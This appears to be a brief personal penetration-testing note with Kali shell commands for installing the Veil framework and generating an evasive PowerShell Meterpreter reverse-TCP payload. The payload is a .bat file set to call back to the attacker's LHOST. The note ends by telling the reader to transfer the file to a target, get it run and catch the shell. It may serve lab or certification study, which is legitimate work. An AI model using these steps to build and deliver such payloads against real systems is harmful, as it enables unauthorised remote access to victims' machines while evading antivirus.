```bash - kali
sudo apt install veil
```

```bash - kali
veil
```

Next through all the prompts if setting up for the first time.

If told to, run:
```bash - kali
/usr/share/veil/config/setup.sh --force --silent
```

```bash - kali
use 1
```

```bash - kali
list
```

example: `powershell/meterpreter/rev_tcp.py`

```bash - kali
use 22
```

```bash - kali
set LHOST $KALI
```

```bash - kali
options
```

```bash - kali
generate
```

```bash - kali
reverseveil
```

```bash - kali
cp /var/lib/veil/output/source/reverseveil.bat .
```

[[APON/6._Tools/Metasploit#Meterpreter Listener 1 Liner]]

Transfer to target, get it ran, catch shell.






